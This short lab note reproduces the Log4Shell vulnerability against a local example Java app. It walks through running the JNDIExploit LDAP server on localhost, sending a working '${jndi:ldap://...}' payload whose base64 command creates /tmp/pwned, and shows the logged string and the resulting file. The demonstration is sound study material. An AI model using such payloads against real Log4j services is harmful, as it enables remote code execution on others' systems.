# Exploiting class inclusion

_Instructions taken from [christophetd/log4shell-vulnerable-app](https://github.com/christophetd/log4shell-vulnerable-app)_

## Setup JNDIExploit

[feihong-cs/JNDIExploit](https://github.com/feihong-cs/JNDIExploit/)

```
$ wget https://github.com/feihong-cs/JNDIExploit/releases/download/v1.2/JNDIExploit.v1.2.zip
$ unzip JNDIExploit.v1.2.zip
$ java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 127.0.0.1 -p 9000
```

## Send the payload

Payload: `${jndi:ldap://127.0.0.1:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}`

For example using `class-inclusion-ex`.

```
$ rm /tmp/pwn

$ ./gradlew run --console=plain
> Task :app:compileJava UP-TO-DATE
> Task :app:processResources NO-SOURCE
> Task :app:classes UP-TO-DATE

> Task :app:run
> ${jndi:ldap://127.0.0.1:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}
19:54:01.224 [main] ERROR class_inclusion_ex.App - ${jndi:ldap://127.0.0.1:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}

$ ls /tmp/pwned
/tmp/pwned
```

